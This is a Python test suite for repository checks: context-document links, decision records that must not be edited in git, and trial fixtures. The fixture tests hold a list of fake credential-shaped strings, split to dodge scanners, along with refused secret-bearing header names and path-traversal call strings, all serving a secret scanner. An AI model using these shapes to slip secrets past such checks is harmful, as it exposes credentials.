        planted = clone({".claude/skills/run-a-platform-trial/SKILL.md": good.replace("run-it", "run-a-platform-trial")
                         + "See `tools/gone.py`.\n", ".claude/skills/other/SKILL.md": "# Other\n"})
        problems = check_context.run(planted)
        for words in ("SKILL.md: names tools/gone.py", "other/SKILL.md: the root AGENTS.md does not point to it",
                      "other/SKILL.md: opens with no frontmatter"):
            self.assertTrue(caught(problems, words), words)

    def test_a_second_copy_of_the_review_standard_is_caught(self):
        root = tree({"docs/standards/review.md": "# Review\n", "docs/standards/release.md": "# Release\n"})
        problems = check_context._standards(root)
        self.assertTrue(caught(problems, "the review standard is"))
        self.assertTrue(caught(problems, "release.md: the standards are"))

    def test_only_the_design_record_is_exempt(self):
        root = tree({"docs/architecture/review.md": "See `scripts/gone.sh`.\n", "docs/notes/a.md": "x\n",
                     "docs/architecture-notes.md": "x\n"})
        self.assertEqual([p.name for p in check_context._markdown(root)], ["architecture-notes.md", "a.md"])

    def test_a_cell_may_hold_a_pipe_and_a_second_table_is_not_a_boundary(self):
        self.assertEqual(check_context._cells("| `A | B` | x \\| y | `tools/x.py` | "), ["`A | B`", "x | y", "`tools/x.py`"])
        body = "| B | Check |\n|---|---|\n| b | c |\n\nMore.\n\n| Other | Table |\n|---|---|\n| d | e |\n"
        self.assertEqual(check_context._rows(body), [["b", "c"]])

    def test_the_whole_check_reads_every_document(self):
        lessons = (ROOT / "docs" / "lessons.md").read_text()
        planted = {"docs/lessons.md": lessons + "\nSee `tools/gone.py`.\n",
                   "docs/decisions/0001-one-repo-and-a-kernel-that-does-no-io.md": "# 0001. Gutted\n",
                   "docs/standards/tests.md": "# Tests\n", "kernel/AGENTS.md": "# kernel/\n"}
        problems = check_context.run(clone(planted))
        for words in ("docs/lessons.md: names tools/gone.py", "0001-one-repo-and-a-kernel-that-does-no-io.md: no section",
                      "docs/standards/tests.md states no rule", "kernel/AGENTS.md: no table of rules"):
            self.assertTrue(caught(problems, words), words)


RECORD = ("# 0001. One thing\n\nStatus: accepted.\n\n## Decision\n\nWe do one thing.\nAnd only that.\n\n"
          "## Why\n\nTwo things split the work.\n\n## Boundaries\n\n| Boundary | Check |\n|---|---|\n"
          "| One thing | `tools/check_x.py` |\n")
FIRST = "docs/decisions/0001-one-thing.md"
LATER = "docs/decisions/0002-two-things.md"
REPLACED = RECORD.replace("Status: accepted.", "Status: replaced by `%s`, which holds\nthe rule in force." % LATER)
REPLACING = RECORD.replace("# 0001. One thing", "# 0002. Two things").replace(
    "Status: accepted.", "Status: accepted. Replaces `%s`,\nand keeps all of it." % FIRST)
EDITED = "title, Decision or Why changed"


def history(files: dict = None) -> pathlib.Path:
    """A repo whose main, on origin, holds decision 0001 and `files`; the working tree is main, unchanged."""
    root = tree(dict({FIRST: RECORD}, **(files or {})))
    git(root, "init", "-q", "-b", "main")
    committed(root, "main")
    return root


def committed(root: pathlib.Path, message: str) -> None:
    """Commit all of `root` on its branch, and when that is main, move origin's main to it."""
    git(root, "add", "-f", ".")
    git(root, "-c", "user.name=T", "-c", "user.email=t@example.com", "commit", "-q", "-m", message)
    if git(root, "branch", "--show-current").strip() == "main":
        git(root, "update-ref", "refs/remotes/origin/main", "HEAD")


def edited(root: pathlib.Path, files: dict, commit: bool = False) -> pathlib.Path:
    """`root` with `files` written over it, and committed on a branch when `commit`."""
    for rel, text in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(text)
    if commit:
        git(root, "checkout", "-q", "-b", "change")
        committed(root, "change")
    return root


def refused(files: dict, words: str, base: dict = None) -> bool:
    """Does the check refuse `files` written over main, as `base` has it, saying `words`?"""
    return caught(check_decisions.run(edited(history(base), files)), words)


@contextlib.contextmanager
def outside_actions():
    """Run as anywhere but GitHub Actions, where a tree with no .git is an export and is skipped."""
    with mock.patch.dict(os.environ):
        os.environ.pop("GITHUB_ACTIONS", None)
        yield


class Decisions(unittest.TestCase):
    def test_an_edit_to_a_decision_is_refused(self):
        for commit in (False, True):     # in the working tree, or committed on the branch
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit)
                self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: its " + EDITED))
        # The whole record is compared but its Status and Boundaries, so no heading or line break gets round it.
        ways = {
            "a second Decision, the original last": RECORD.replace("one thing.", "two things.")
            + "\n## Decision\n\nWe do one thing.\nAnd only that.\n",
            "an amendment as a heading of its own": RECORD.replace("only that.\n", "only that.\n\n# Amendment\n\nTwo.\n"),
            "a section of its own": RECORD.replace("## Boundaries", "## Amendment\n\nTwo things now.\n\n## Boundaries"),
            "a line before the Decision": RECORD.replace("Status: accepted.\n", "Status: accepted.\n\nIt no longer holds.\n"),
            "a fence around the original": RECORD.replace("And only that.", "Two.\n```\n## Decision\nAnd only that.\n```"),
            "the lines broken elsewhere": RECORD.replace("one thing.\nAnd only", "one thing. And\nonly"),
            "the title": RECORD.replace("# 0001. One thing", "# 0001. Two things"),
            "text after the table": RECORD + "\nAnd we now do two things.\n",
            "a second table": RECORD + "\n| Decision |\n|---|\n| We do two things |\n",
        }
        for name, text in ways.items():
            with self.subTest(name):
                self.assertTrue(refused({FIRST: text}, EDITED))

    def test_an_edit_to_why_is_refused(self):
        self.assertTrue(refused({FIRST: RECORD.replace("split the work", "share the work")}, "its " + EDITED))
        gone = RECORD.replace("## Why\n\nTwo things split the work.\n\n", "")
        self.assertTrue(refused({FIRST: gone}, EDITED))

    def test_an_edit_with_status_naming_the_record_that_replaces_it_is_allowed(self):
        for commit in (False, True):
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: REPLACED, LATER: REPLACING}, commit)
                self.assertEqual(check_decisions.run(root), [])
        # The Status is all that changes: the Decision and Why stay as they were.
        self.assertTrue(refused({FIRST: REPLACED.replace("one thing.", "two."), LATER: REPLACING}, EDITED))
        # The record named is new in this change, exists, comes later, and says in its own Status that it replaces this.
        self.assertTrue(refused({FIRST: REPLACED}, "not new in this change", base={LATER: REPLACING}))
        self.assertTrue(refused({FIRST: REPLACED}, "which does not exist"))
        earlier = REPLACED.replace("0002-two-things", "0000-nothing")
        self.assertTrue(refused({FIRST: earlier, "docs/decisions/0000-nothing.md": REPLACING}, "not a later record"))
        for status in ("Status: accepted.", "Status: accepted. Replaces `docs/decisions/0009-x.md`.",
                       "Status: accepted. It does not replace `%s`." % FIRST):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: REPLACED, LATER: RECORD.replace("Status: accepted.", status)},
                                        "does not say it replaces this one"))
        # "replaced by" opens the Status, in decision 0012's words; it is not a phrase found anywhere in it.
        for status in ("Status: accepted, not replaced by `%s`." % LATER, "Status: accepted. Replaced by `%s`." % LATER,
                       "Status: replaced by `%s`" % LATER.replace(".md", ".mdx"), "Status: superseded.",
                       "Status: replaced by %s." % LATER):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING},
                                        "its Status changes only to say what replaces it"))
        # Once replaced, the Status is fixed: not changed back, nor pointed at another record.
        third = "docs/decisions/0003-three.md"
        status = REPLACED.split("\n\n")[1]
        for again in ("Status: accepted.", "Status: replaced by `%s`." % third):
            with self.subTest(again):
                self.assertTrue(refused({FIRST: REPLACED.replace(status, again), third: REPLACING.replace("0002", "0003")},
                                        "is fixed from then on", base={FIRST: REPLACED, LATER: REPLACING}))

    def test_a_new_record_that_replaces_one_sets_that_ones_status(self):
        # A new record that says it replaces another is held to it: that record is on main, earlier, and in this
        # change says it is replaced by this one.
        third = "docs/decisions/0003-three.md"
        cases = {
            "the record it replaces left as it was": ({LATER: REPLACING}, None, "whose Status does not say"),
            "a record that does not exist": ({LATER: REPLACING.replace(FIRST, "docs/decisions/0000-none.md")}, None,
                                             "0000-none.md, which is not a record main holds"),
            "a record new in this change": ({LATER: REPLACING.replace(FIRST, third), third: RECORD}, None,
                                            "0003-three.md, which is not a record main holds"),
            "a later record": ({LATER: REPLACING.replace(FIRST, third),
                                third: RECORD.replace("Status: accepted.", "Status: replaced by `%s`." % LATER)},
                               {third: RECORD}, "0003-three.md, which is not an earlier record"),
            "a record another one replaces": ({FIRST: REPLACED.replace(LATER, third), LATER: REPLACING,
                                               third: REPLACING.replace("0002", "0003")}, None,
                                              "0002-two-things.md: it replaces docs/decisions/0001-one-thing.md, whose"),
            # Every record it names is replaced: one more, left as it was or not there at all, is refused.
            "one more, unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `%s`" % (FIRST, third))}, {third: RECORD},
                "0003-three.md, which is not an earlier record"),
            "one more, earlier and unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s`, `docs/decisions/0000-zero.md`" % FIRST)}, {"docs/decisions/0000-zero.md": RECORD},
                "0000-zero.md, whose Status does not say"),
            "one more that is not there": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `docs/decisions/0000-none.md`" % FIRST)}, None,
                "0000-none.md, which is not a record main holds"),
            "said another way": ({FIRST: REPLACED, LATER: REPLACING.replace("accepted. Replaces", "proposed. Replaces")},
                                 None, "only as 'Status: accepted. Replaces'"),
            "the path without backticks": ({LATER: REPLACING.replace("`%s`" % FIRST, FIRST)}, None,
                                           "only as 'Status: accepted. Replaces'"),
        }
        # The whole declaration is read: past it, no word of replacing and no record's path, in either record.
        missing = "docs/decisions/0000-missing.md"
        for status in ("Status: accepted. Replaces `%s`. It also replaces `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and SUPERSEDES `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and keeps all of `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`; and `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s` in part." % FIRST):
            cases[status] = ({FIRST: REPLACED, LATER: REPLACING.replace(REPLACING.split("\n\n")[1], status)}, None,
                             "0002-two-things.md: its Status says what it replaces only as")
        for status in ("Status: replaced by `%s`. It is also replaced by `%s`." % (LATER, third),
                       "Status: replaced by `%s`, with `%s`." % (LATER, third)):
            cases[status] = ({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING}, None,
                             "0001-one-thing.md: its Status changes only to say what replaces it")
        for name, (files, base, words) in cases.items():
            with self.subTest(name):
                self.assertTrue(refused(files, words, base=base), name)

    def test_a_boundary_row_added_is_allowed(self):
        added = RECORD + "| Another thing | `tests/test_x.py::test_y` |\n"
        moved = added.replace("`tools/check_x.py`", "`tools/check_y.py`")
        for text in (added, moved, added.replace("| One thing |", "|  One  thing |")):
            with self.subTest(text=text):
                self.assertEqual(check_decisions.run(edited(history(), {FIRST: text}, commit=True)), [])
        # A row is not taken away, and its Boundary does not change.
        for text in (RECORD.replace("| One thing | `tools/check_x.py` |\n", ""),
                     RECORD.replace("| One thing |", "| Two things |"),
                     RECORD.replace("| One thing | `tools/check_x.py` |", "| One thing | or two | `tools/check_x.py` |")):
            with self.subTest(text=text):
                self.assertTrue(refused({FIRST: text}, "the row 'One thing"))

    def test_a_new_record_is_allowed(self):
        self.assertEqual(check_decisions.run(edited(history(), {LATER: REPLACING.replace("Replaces", "Adds to")},
                                                    commit=True)), [])
        self.assertEqual(check_decisions.run(history()), [])
        # A record taken away, or renamed, is not a new one.
        root = history()
        (root / FIRST).rename(root / "docs/decisions/0001-another-name.md")
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_record_has_one_status_first_no_comment_and_is_no_link(self):
        ways = {
            "a second Status": RECORD.replace("## Why", "Status: replaced by `%s`.\n\n## Why" % LATER),
            "a Status below the Decision": RECORD.replace("Status: accepted.\n\n", "") + "\nStatus: accepted.\n",
            "a line before the Status": RECORD.replace("Status:", "Note.\n\nStatus:"),
            "a hidden comment": RECORD.replace("And only that.", "And only that.<!-- and two -->"),
            "a second Boundaries": RECORD + "\n## Boundaries\n\n| B | C |\n|---|---|\n",
            "no title": RECORD.replace("# 0001. One thing\n", ""),
            "a title that is not a heading": RECORD.replace("# 0001.", "0001."),
        }
        for name, text in ways.items():
            for rel in (FIRST, LATER):      # a record in the base, or a new one
                with self.subTest(name, rel=rel):
                    self.assertTrue(refused({rel: text}, "%s: it " % rel))
        root = history()
        os.symlink(str(root / FIRST), str(root / LATER))
        self.assertTrue(caught(check_decisions.run(root), "0002-two-things.md: is a link"))
        root = history()
        git(root, "mv", "docs/decisions", "elsewhere")
        os.symlink("../elsewhere", str(root / "docs" / "decisions"))
        self.assertTrue(caught(check_decisions.run(root), "docs/decisions: is a link"))
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_worktree_is_compared_with_where_its_branch_left_main(self):
        # A worktree's .git is a file, and the check compares there as in any clone.
        root = history()
        other = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "worktree"
        git(root, "worktree", "add", "-q", "-b", "change", str(other))
        self.assertTrue((other / ".git").is_file())
        self.assertEqual(check_decisions.run(other), [])
        edited(other, {FIRST: RECORD.replace("one thing.", "two things.")})
        self.assertTrue(caught(check_decisions.run(other), "0001-one-thing.md: its " + EDITED))
        # Main moves on after the branch left it, and adds a record the branch has not got: that is not gone.
        root = history()
        git(root, "branch", "change")
        committed(edited(root, {LATER: REPLACING.replace("Replaces", "Adds to")}), "later")
        git(root, "checkout", "-q", "change")
        self.assertFalse((root / LATER).exists())
        self.assertEqual(check_decisions.run(root), [])

    def test_a_base_that_cannot_be_read_fails_and_only_an_export_is_skipped(self):
        # With a .git and no base to read the check fails, and never passes.
        bare = tree({FIRST: RECORD})
        git(bare, "init", "-q")
        shallow = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "shallow"
        git(SCRATCH.name, "clone", "-q", "--depth", "1", (history() / ".git").as_uri(), str(shallow))
        no_origin = history()
        git(no_origin, "update-ref", "-d", "refs/remotes/origin/main")
        for name, root, words in (("no commit", bare, "failed"), ("shallow", shallow, "shallow"),
                                  ("no origin", no_origin, "git rev-parse failed")):
            with self.subTest(name):
                self.assertTrue(caught(check_decisions.run(root), "cannot be compared"))
                self.assertIn(words, check_decisions.described(root))
        with mock.patch("shutil.which", return_value=None):
            self.assertTrue(caught(check_decisions.run(history()), "git is not on PATH"))
        # A replacement ref is not read: the base is main as it was committed, not as a replace says.
        root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit=True)
        git(root, "replace", git(root, "rev-parse", "main").strip(), "HEAD")
        self.assertTrue(caught(check_decisions.run(root), "its " + EDITED))
        # An export has no .git, and so no history: the comparison is skipped, and verify says so; but not in CI.
        export = tree({FIRST: RECORD.replace("one thing.", "two things.")})
        with outside_actions():
            self.assertEqual(check_decisions.run(export), [])
            self.assertIn("skipped", check_decisions.described(export))
        with mock.patch.dict(os.environ, GITHUB_ACTIONS="true"):
            self.assertTrue(caught(check_decisions.run(export), "in GitHub Actions the checkout always writes one"))
        # A record's form needs no base, and is held in an export too.
        with outside_actions():
            self.assertTrue(caught(check_decisions.run(tree({FIRST: RECORD + "<!-- -->\n"})), "an HTML comment"))


def fixture(**fields) -> str:
    """The example fixture, as text, with `fields` written over it."""
    data = json.loads((ROOT / "examples" / "trial.json").read_text())
    data.update(fields)
    return json.dumps(data, indent=2)


GROUNDING = (ROOT / "sim" / "grounding.py").read_text()


def grounded(fixture_path: str, trials: str = '("P-18",)') -> str:
    """sim/grounding.py with the rule P-18 asks of a killed job grounded by `fixture_path`, a path or a tuple of them
    written as a literal, and asked by `trials`; a P-7 among them quotes its row, as each trial a rule names must."""
    rule = '("a_killed_job_times_out", "A job killed part way concludes timed_out", ("P-18",), None, None)'
    asked = '"a_killed_job_times_out": {"P-18": "when a job times out or is cancelled?"}'
    assert GROUNDING.count(rule) == 1 and GROUNDING.count(asked) == 1
    literal = fixture_path if fixture_path.startswith("(") else '"%s"' % fixture_path
    quotes = asked[:-1] + (', "P-7": "when an App pushed last"}' if '"P-7"' in trials else "}")
    return GROUNDING.replace(rule, rule.replace('("P-18",), None, None)', '%s, %s, None)' % (trials, literal))).replace(
        asked, quotes)


TAIL = "A" * 36
# What the security pass tried to slip through. Each must be refused wherever it stands in a fixture.
SHAPED = {
    "ghp": "gh" + "p_" + TAIL, "gho": "gh" + "o_" + TAIL, "ghu": "gh" + "u_" + TAIL, "ghs": "gh" + "s_" + TAIL,
    "ghr": "gh" + "r_" + TAIL, "short ghs": "gh" + "s_short", "pat": "github" + "_pat_11" + "A" * 20 + "_" + "b" * 59,
    "after an underscore": "x_gh" + "p_" + TAIL, "after a digit": "%3Agh" + "p_" + TAIL, "upper case": "GH" + "P_" + TAIL,
    "raw url": "https://raw.githubusercontent.com/o/r/main/f?to" + "ken=GHSAT0AAAAAACAAAAAAAAAAAAAAAAAAZZZZZZ",
    "ghsat": "GHS" + "AT0AAAAAACAAAAAA", "jwt": "eyJ" + "hbGciOiJSUzI1NiJ9.eyJpc3MiOiIxMjMifQ.sig", "short jwt": "eyJ" + "0eXAi.eyJ.sig",
    "token scheme": "tok" + "en abcdef0123456789abcdef0123456789abcdef",
    "basic": "Bas" + "ic eC1hY2Nlc3MtdG9rZW46Z2hzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
    "bearer": "Bear" + "er abc", "bearer in capitals": "BEAR" + "ER abc",
    "set-cookie in a string": "Set-" + "Cookie: user_session=abcdef; path=/", "authorization in a string": "Authoriz" + "ation: x",
    "user and password in a url": "https://don:hunt" + "er2@github.com/combsmith/x.git",
    "token in a url": "https://x-access-tok" + "en:gh" + "s_" + TAIL + "@github.com/o/r",
    "signed url": "https://productionresultssa0.blob.core.windows.net/x?sv=2019&s" + "ig=AbCdEf%2Bxyz%3D&se=2026",
    "amazon signature": "https://objects.githubusercontent.com/x?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Sign" + "ature=abcd1234",
    "amazon credential": "https://x/y?X-Amz-Cred" + "ential=AKIDEXAMPLE%2F2026",
    "hex beside a keyword": "access_tok" + "en=" + "a1" * 20, "runner registration": "AABF3JGZDX3P5PMEXLND6TS6FCWO6",
    "jit config": "encoded_jit" + "_config", "private key": "-----BEGIN OPENSSH PRIV" + "ATE KEY-----\nb3Blbn",
    "private key body": "MIIEowIBAAKCAQEA" + "x" * 60, "openssh key body": "b3BlbnNzaC1rZXktdjE" + "AAAAB",
    "base64 of a token": base64.b64encode(("gh" + "p_" + TAIL).encode()).decode(),
    "base64 of a runner's credentials": base64.b64encode(json.dumps({".runner": "x", ".credentials_rsaparams": "k"}).encode()).decode(),
    "anthropic": "sk-" + "ant-oat01-" + "A" * 40,
    "base64 of a token behind a byte that does not print": base64.b64encode(("\x00gh" + "p_" + TAIL).encode()).decode(),
}
# What a fixture keeps: GitHub's ordinary words must not be refused.
PLAIN = ["6dcb09b5b57875f334f61aebed695e2e4193db5e", "a" * 40, "application/vnd.github+json", "MDQ6VXNlcjE=",
         "https://api.github.com/repos/combsmith/x/check-runs/4", "2026-10-15T14:02:11Z", "Requires authentication",
         "highs and lows", "bearer", "factory-run-r1", "Resource not accessible by integration"]
REFUSED_KEYS = ["Authorization", "AUTHORIZATION", "Authorization ", "Proxy-Authorization", "Set-Cookie", "cookie",
                "x-github-otp", "x-access-token", "github_token", "GITHUB_TOKEN", "accessToken", "installation_token",
                "encoded_jit_config", "x-jit-config", "jwt", "auth", "Auth ", "webhook_secret", "client_secret", "password", "credentials", "token",
                "api_key", "apiKey", "x-api-key", "private_key", "privateKey", "passphrase", "ssh_passphrase",
                "authentication", "passwd", "passcode", "bearer", "access_key", "accessKey", "encryption_key", "signing_key", "master_key",
                "auth_key", "x-auth-key", "authKey", "pwd", "encryptionKey", "signingKey", "masterKey"]
PLAIN_KEYS = ["token_type", "input_tokens", "output_tokens", "location", "key", "value", "author", "external_id",
              # The vendor CLI's counts (issue 178), as it spells them.
              "inputTokens", "outputTokens", "cacheReadInputTokens", "cacheCreationInputTokens", "maxOutputTokens",
              "thinkingTokens", "thinking_tokens", "ephemeral_1h_input_tokens", "ephemeral_5m_input_tokens",
              "output_tokens_details"]
# Not caught, by design or as a known hole: a commit hash alone is no credential; a token split across two strings
# and a one-time code alone have no shape. The field names a header or field must have are the guard there.


class Trials(unittest.TestCase):
    def test_a_fixture_that_is_misnamed_or_invalid_is_caught(self):
        root = clone({"trials/P-12.json": fixture(trial="P-13"), "trials/P-12.retry.json": "{}",
                      "trials/notes.md": "x\n", "trials/P12.json": fixture(), "trials/P-98.json/P-98.json": fixture(trial="P-98")})
        problems = check_trials.run(root)
        for words in ("trials/P-12.json: records trial P-13", "trials/P-12.retry.json: $: missing",
                      "trials/notes.md: trials/ holds fixtures only", "trials/P12.json: trials/ holds fixtures only",
                      "trials/P-98.json: trials/ holds fixtures only"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(check_trials.run(clone({"trials/P-12.json": fixture(), "trials/P-12.retry.json": fixture()})), [])

    def test_a_credential_in_a_fixture_is_caught(self):
        for name, value in sorted(SHAPED.items()):
            self.assertTrue(check_trials._credentials({"note": value}, ""), name)
            self.assertTrue(check_trials._credentials({"a": [[{"b": [value]}]]}, ""), name)
        for value in PLAIN:
            self.assertEqual(check_trials._credentials({"note": value}, ""), [], value)
        for key in REFUSED_KEYS:
            self.assertTrue(check_trials._credentials({"a": [[{key: "x"}]]}, ""), key)
        for name, value in sorted(SHAPED.items()):      # a key shaped like a credential is one too, named never by itself
            found = check_trials._credentials({"a": {value: 1}}, "")
            self.assertEqual([p for p, _ in found], ["a." + check_trials.KEY_SHAPED], name)
            found = check_trials._headers({"exchanges": [{"request": {"headers": {value: "x"}}}]})
            self.assertEqual([p for p, _ in found], ["exchanges[0].request.headers." + check_trials.KEY_SHAPED], name)
        split = "Bearer\x00Zx9Qw8Er7Ty6Ui5Op4As3Df5"            # a raw control character splits the shape
        self.assertTrue(check_trials.shaped(SHAPED["runner registration"] + "\n"), "a registration token before a newline")
        found = check_trials._headers({"exchanges": [{"request": {"headers": {split: "x"}}}]})
        self.assertEqual([p for p, _ in found], ["exchanges[0].request.headers." + check_trials.KEY_SHAPED])
        # Nor does a message of the check about who asked, read before the schema in an example (issue 247).
        example = json.loads(fixture())
        example["repo"] = "Bearer Zx9Qw8Er7Ty6Ui5Op4As3Df5"
        example["exchanges"][0]["request"]["as"] = {"kind": "subscription", "name": "the Maintainer's own subscription"}
        said = "\n".join(check_trials.fixture_problems(example))
        self.assertIn("hidden whole", said)                     # the message that named the repo, hidden whole
        self.assertNotIn("Zx9Qw8", said)
        # Nor does a schema's error, or any message of the check, carry such a key.
        data = json.loads(fixture())
        data[SHAPED["ghs"]] = 1
        data["Bearer Zx9Qw8Er7Ty6Ui5Op4"] = 1        # a shape that spans a space
        data["exchanges"][0]["request"]["headers"][SHAPED["ghp"]] = "x"
        data["exchanges"][0]["request"]["as"]["kind"] = "Bearer\nZx9Qw8Er7Ty6Ui5Op4As3Df5"   # a shape a repr escapes
        data["exchanges"][0]["request"]["via"] = "Bearer\u000bZx9Qw8Er7Ty6Ui5Op4As3Df5"        # and one it writes as \x0b
        data["repo"] = "Bearer\n Zx9Qw8Er7Ty6Ui5Op4As3Df5"     # an escape and a space: no one word holds the shape
        twice = '{"%s": 1, "%s": 2}' % (SHAPED["gho"], SHAPED["gho"])                        # a fixture that cannot be read
        said = "\n".join(check_trials.run(clone({"trials/P-12.json": json.dumps(data), "trials/P-11.json": twice})))
        self.assertIn(check_trials.KEY_SHAPED, said)
        self.assertIn("trials/P-11.json cannot be read", said)
        for value in list(SHAPED.values()) + ["Zx9Qw8Er7Ty6Ui5Op4"]:
            self.assertNotIn(value, said)
        for key in PLAIN_KEYS:
            self.assertEqual(check_trials._credentials({key: "x"}, ""), [], key)
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "x"
        data["exchanges"][0]["response"]["body"]["note"] = SHAPED["ghs"]
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.headers.Authorization is a field"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].response.body.note holds something shaped"))
        self.assertFalse(any(SHAPED["ghs"] in p for p in problems), "a problem never repeats the credential")

    def test_a_header_a_fixture_may_not_keep_is_caught(self):
        data = json.loads(fixture())
        data["exchanges"][1]["response"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][1]["response"]["headers"]["X-RateLimit-Used"] = "2"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "exchanges[1].response.headers.X-GitHub-SSO is not a header a fixture may keep"))
        self.assertFalse(caught(problems, "X-RateLimit-Used"))
        # What the asking token may do is not kept: no rule needs it, and it advertises the Maintainer's scopes.
        data["exchanges"][1]["response"]["headers"]["x-oauth-scopes"] = "admin:org, delete_repo, repo"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "exchanges[1].response.headers.x-oauth-scopes is not a header a fixture may keep"))
        self.assertNotIn("x-oauth-scopes", check_trials.HEADERS)

    def test_every_example_of_a_fixture_and_the_folder_notes_are_scanned(self):
        data = json.loads((ROOT / "examples" / "invalid" / "trial.run-outside-the-canary.json").read_text())
        data["exchanges"][0]["request"]["headers"]["authorization"] = "x"
        notes = (ROOT / "trials" / "AGENTS.md").read_text() + "\nFor example " + SHAPED["ghs"] + "\n"
        problems = check_trials.run(clone({"examples/invalid/trial.run-outside-the-canary.json": json.dumps(data),
                                           "examples/trial.json": fixture(note=SHAPED["jwt"]), "trials/AGENTS.md": notes}))
        self.assertTrue(caught(problems, "examples/invalid/trial.run-outside-the-canary.json: exchanges[0].request.headers"))
        self.assertTrue(caught(problems, "examples/trial.json: note holds something shaped like a credential"))
        self.assertTrue(caught(problems, "trials/AGENTS.md: holds something shaped like a credential"))

    def test_a_null_repo_goes_with_a_subscription_and_nothing_else(self):
        # Decision 0033. The schema cannot tie the two together, so the check does, both ways.
        vendor = json.loads((ROOT / "examples" / "trial.a-vendors-cli.json").read_text())
        self.assertEqual(check_trials.run(clone({"trials/P-13.json": json.dumps(vendor)})), [])
        problems = check_trials.run(clone({"trials/P-12.json": fixture(repo=None)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.as.kind is app, and repo is null"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[1].request.as.kind is app, and repo is null"))
        inside = dict(vendor, repo="combsmith/" + check_trials.CANARY)
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(inside)}))
        self.assertTrue(caught(problems, "trials/P-13.json: exchanges[0].request.as.kind is subscription, and repo is"))
        mixed = json.loads(json.dumps(vendor))
        mixed["exchanges"].append(json.loads(json.dumps(mixed["exchanges"][0])))
        mixed["exchanges"][1]["request"]["as"] = {"kind": "person", "name": "don-petry"}
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(mixed)}))
        self.assertTrue(caught(problems, "exchanges[1].request.as.kind is person, and repo is null"))
        self.assertFalse(caught(problems, "exchanges[0].request.as.kind"))
        problems = check_trials.run(clone({"examples/trial.json": fixture(repo=None)}))
        self.assertTrue(caught(problems, "examples/trial.json: exchanges[0].request.as.kind is app, and repo is null"))

    def test_the_org_is_the_repo_exactly_when_every_call_is_of_the_org_or_its_apps(self):
        # Decision 0035, both ways: a fixture of the org asks nothing of a repo, and one that asks only of the org
        # and its Apps records the org.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        self.assertEqual(check_trials.run(clone({"trials/P-39.reach.json": json.dumps(reach)})), [])
        of_a_repo = json.loads(json.dumps(reach))
        of_a_repo["exchanges"][1]["request"]["call"] = "GET /repos/combsmith/software-factory/installation"
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(of_a_repo)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: exchanges[1].request.call is not a REST call of the org "
                                         "or its Apps, and repo is combsmith"))
        self.assertFalse(caught(problems, "exchanges[0].request.call"))
        in_the_canary = dict(reach, repo="combsmith/" + check_trials.CANARY)
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(in_the_canary)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: repo is combsmith/%s, and every call is of the org "
                                         "or its Apps" % check_trials.CANARY))
        problems = check_trials.run(clone({"examples/trial.json": fixture(repo="combsmith")}))
        self.assertTrue(caught(problems, "examples/trial.json: exchanges[0].request.call is not a REST call of the org"))

    def test_a_fixture_of_the_org_asks_by_rest_of_this_org_alone_and_climbs_nowhere(self):
        # Another org, a GraphQL query whose call looks like an App's, and a path that climbs out of /apps/ are each
        # a call of something else; the fixture's own calls are not.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        reach["exchanges"] += [json.loads(json.dumps(reach["exchanges"][0])) for _ in range(4)]
        reach["exchanges"][3]["request"]["call"] = "GET /orgs/other-org/installations"
        reach["exchanges"][4]["request"]["via"] = "graphql"
        reach["exchanges"][4]["request"]["call"] = "GET /apps/combsmith-sf-reader"
        reach["exchanges"][5]["request"]["call"] = "GET /apps/../repos/combsmith/software-factory"
        reach["exchanges"][6]["request"]["call"] = "GET /installation/%2E%2E/repos/combsmith/software-factory"
        self.assertEqual([where for where, _ in check_trials._askers(reach)],
                         ["exchanges[%d].request.call" % i for i in (3, 4, 5, 6)])
        reach["exchanges"][3]["request"]["call"] = "GET /orgs/combsmith/installations?per_page=100"
        reach["exchanges"][4]["request"]["via"] = "rest"
        self.assertEqual([where for where, _ in check_trials._askers(reach)],
                         ["exchanges[5].request.call", "exchanges[6].request.call"])

